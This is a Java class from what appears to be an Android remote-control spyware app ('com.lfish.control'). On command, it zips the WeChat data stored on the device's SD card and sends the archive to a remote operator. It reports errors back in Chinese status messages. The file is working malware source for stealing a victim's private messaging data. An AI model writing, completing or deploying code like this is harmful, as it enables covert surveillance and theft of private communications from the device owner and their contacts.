package com.lfish.control.action.actiondomian;

import com.lfish.control.ControlApplication;
import com.lfish.control.action.BaseBeanAction;
import com.lfish.control.action.actiontool.CmdUtils;
import com.lfish.control.action.actiontool.Utils;
import com.lfish.control.action.actiontool.Zip;

import java.io.File;

public class GetWeChatSdAction extends BaseBeanAction {

	@Override
	public void run() {
		// TODO Auto-generated method stub

		if (Utils.isSDCardPathAvailable(ControlApplication.context)) {

			String getFileName = Utils.SDPATH + Utils.DIR + File.separator+CmdUtils.GetFileName(ControlApplication.context, getCmd()+"", "zip");

			try {
				Zip.weixin(getFileName);
				SendFile(getFileName);
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				sendTxt("ZIP打包失敗（獲取微信SD存儲）");
			}
		}else{
			sendTxt("SD卡不能訪問（獲取微信SD存儲）");
		}
	}

}
